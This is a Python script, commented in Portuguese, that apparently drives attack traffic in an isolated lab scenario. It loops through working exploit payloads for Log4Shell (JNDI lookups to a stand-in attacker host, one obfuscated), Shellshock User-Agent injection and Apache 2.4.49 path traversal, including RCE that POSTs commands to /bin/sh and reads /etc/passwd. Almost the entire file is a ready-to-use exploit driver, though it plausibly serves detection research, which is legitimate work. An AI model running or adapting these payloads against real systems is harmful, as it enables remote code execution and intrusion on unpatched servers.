"""Atacante do cenario VulHub (#22).

Exercita tres CVEs conhecidas no sistema composto atras do proxy (roteamento
pelo cabecalho Host), intercalando reconhecimento de aparencia benigna com
tentativas de exploracao em ritmo moderado (nao volumetrico):

* Log4Shell (CVE-2021-44228) no Apache Solr – lookup JNDI em parametro/cabecalho;
* Shellshock (CVE-2014-6271) em CGI do Bash – payload no User-Agent;
* Apache httpd 2.4.49 (CVE-2021-41773) – path traversal e RCE via cgi-bin.

Os payloads apontam para hosts inexistentes (``*.invalid``) e executam apenas
comandos de leitura (``id``, ``/etc/passwd``) dentro do laboratorio isolado.
"""
import argparse
import http.client
import os
import random
import time
from urllib.parse import urlparse

TARGET = urlparse(os.getenv("TARGET", "http://nginx-proxy"))
UAS = ["Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/119.0 Safari/537.36",
       "python-requests/2.31.0", "curl/8.4.0"]


def req(method, host, path, rng, headers=None, data=None):
    """Envia a requisicao com o path literal (sem normalizacao de '%2e' ou '..')."""
    h = {"Host": host, "User-Agent": rng.choice(UAS)}
    h.update(headers or {})
    if data is not None:
        h["Content-Type"] = "application/x-www-form-urlencoded"
    try:
        conn = http.client.HTTPConnection(TARGET.hostname, TARGET.port or 80, timeout=10)
        conn.request(method, path, body=data, headers=h)
        conn.getresponse().read()
        conn.close()
    except (OSError, http.client.HTTPException):
        pass


def jndi(rng):
    tag = rng.randint(1000, 9999)
    return rng.choice([
        f"${{jndi:ldap://c2-{tag}.attacker.invalid/a}}",
        f"${{${{lower:j}}ndi:ldap://c2-{tag}.attacker.invalid/a}}",
        f"${{jndi:dns://c2-{tag}.attacker.invalid}}",
    ])


def step(rng):
    choice = rng.random()
    if choice < 0.15:  # reconhecimento
        rng.choice([
            lambda: req("GET", "solr.lab", "/solr/", rng),
            lambda: req("GET", "solr.lab", "/solr/admin/info/system?wt=json", rng),
            lambda: req("GET", "cgi.lab", "/", rng),
            lambda: req("GET", "httpd.lab", "/", rng),
            lambda: req("GET", "httpd.lab", "/cgi-bin/", rng),
        ])()
    elif choice < 0.45:  # Log4Shell
        p = jndi(rng)
        enc = p.replace("$", "%24").replace("{", "%7B").replace("}", "%7D").replace(":", "%3A").replace("/", "%2F")
        rng.choice([
            lambda: req("GET", "solr.lab", f"/solr/admin/cores?action={enc}&wt=json", rng),
            lambda: req("GET", "solr.lab", f"/solr/admin/collections?action={enc}", rng),
            lambda: req("GET", "solr.lab", "/solr/", rng, headers={"User-Agent": p}),
        ])()
    elif choice < 0.70:  # Shellshock
        cmd = rng.choice(["/usr/bin/id", "/bin/cat /etc/passwd", "/bin/uname -a"])
        req("GET", "cgi.lab", "/victim.cgi", rng, headers={"User-Agent": f"() {{ :; }}; echo; {cmd}"})
    else:  # CVE-2021-41773
        rng.choice([
            lambda: req("GET", "httpd.lab", "/icons/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd", rng),
            lambda: req("GET", "httpd.lab", "/cgi-bin/.%2e/.%2e/.%2e/.%2e/etc/passwd", rng),
            lambda: req("POST", "httpd.lab", "/cgi-bin/.%2e/.%2e/.%2e/.%2e/bin/sh", rng, data="echo;id"),
        ])()


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--seed", type=int, default=0)
    ap.add_argument("--delay", type=float, default=0.0, help="atraso inicial (s), para inicio escalonado")
    ap.add_argument("--min-gap", type=float, default=0.5)
    ap.add_argument("--max-gap", type=float, default=3.0)
    args = ap.parse_args()
    rng = random.Random(args.seed)
    time.sleep(args.delay)
    print(f"[vulhub] iniciando ataque (seed={args.seed})", flush=True)
    while True:
        step(rng)
        time.sleep(rng.uniform(args.min_gap, args.max_gap))


if __name__ == "__main__":
    main()
